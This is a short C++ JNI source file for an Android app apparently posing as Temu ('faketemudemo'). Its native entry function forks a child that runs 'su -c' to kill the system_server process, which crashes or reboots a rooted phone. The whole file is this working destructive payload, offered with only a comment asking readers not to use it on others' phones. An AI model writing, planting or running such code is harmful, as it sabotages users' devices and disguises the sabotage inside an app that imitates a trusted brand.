// PLEASE DONT USE THIS TO BREAK OTHERS PHONES
#include <jni.h>
#include <string>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

extern "C" JNIEXPORT void JNICALL
Java_com_test_faketemudemo_MainActivity_LibTemuEntry(JNIEnv* env, jobject) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: run 'su -c "your command"'
        char *args[] = {
            (char*)"su",
            (char*)"-c",
            (char*)"kill $(pidof system_server)",
            NULL
        };
        execvp("su", args);  // execvp searches PATH for 'su'
        _exit(1); // execvp failed
    } else if (pid > 0) {
        // Parent process: wait for child
        waitpid(pid, NULL, 0);
    }
}
